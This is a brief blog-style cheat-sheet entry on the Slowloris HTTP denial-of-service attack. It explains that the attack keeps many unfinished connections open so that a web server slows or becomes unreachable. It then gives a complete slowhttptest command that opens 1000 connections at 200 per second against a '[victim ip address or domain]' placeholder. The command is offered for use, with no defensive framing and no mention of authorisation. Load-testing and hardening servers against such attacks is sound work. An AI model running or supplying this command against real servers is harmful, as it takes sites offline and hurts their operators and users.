---
layout: post
title:  "Slowhttptest"
categories: scan deny
summary: Slowlori attack is opening connections to HTTP server and keeps connections open
---

{% include instructions.md %}

# {{page.title}}
Slowlori attack is opening connections to HTTP server and keeps connections open. This makes web server to be very slow or unreachable.

Open 1000 connection and send only unfinished HTTP requests. Open 200 new connections per second and keep connections open by sending GET method in every 10 second with maximum length of 24 and wait 3 seconds for response.
{% highlight shell %}
# slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://[victim ip address or domain] -x 24 -p 3
{% endhighlight %}

